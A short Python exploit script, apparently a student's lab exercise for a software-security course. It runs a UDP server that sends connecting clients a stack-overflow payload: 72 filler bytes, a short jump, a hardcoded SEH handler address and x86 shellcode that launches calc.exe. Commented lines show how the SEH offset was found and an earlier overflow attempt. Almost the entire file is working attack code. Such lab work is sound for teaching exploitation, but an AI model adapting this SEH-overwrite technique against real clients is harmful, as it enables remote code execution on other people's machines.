#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' 软件安全与漏洞分析第五周任务, 要求利用服务端发送一段 Payload, 覆盖掉客户端自带的 SEH 结构体, 然后成功弹出计算器
利用的是堆栈溢出漏洞以及 SEH 覆盖的方法
'''
__author__ = '__L1n__w@tch'

import socketserver

buf = b"\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8D\x04\x24\x50\xB9\xC7\x93\xBF\x77\xFF\xD1"
shellcode = buf


class MyUDPHandler(socketserver.BaseRequestHandler):
    """
    This class works similar to the TCP handler class, except that
    self.request consists of a pair of data and client socket, and since
    there is no connection the client address must be given explicitly
    when sending data back via sendto().
    """

    def handle(self):
        data = self.request[0].strip()
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)

        # 用来定位 SEH 结构
        # data = b""
        # for i in range(100):
        #     data += bytes([ord("A") + i // 10])
        # print(data)

        # ShellCode 发送
        # socket.sendto(data, self.client_address)
        # socket.sendto(b"A" * 72 + b"\xeb\x06\x90\x90" + b"\x00\x40\x12\x70"[::-1] + shellcode, self.client_address)
        socket.sendto(b"A" * 72 + b"\xeb\x06\x90\x90" + b"\x00\x40\x92\xbb"[::-1] + shellcode,
                      self.client_address)
        # socket.sendto(data.upper(), self.client_address)

        # 用于进行堆栈溢出
        # socket.sendto(shellcode + b"\xdd" * (64 - 26) + b"\xcc\xcc\xcc\xcc\xF41024\xFC\x12\x00", self.client_address)


def main():
    HOST, PORT = "192.168.117.1", 9999
    server = socketserver.UDPServer((HOST, PORT), MyUDPHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
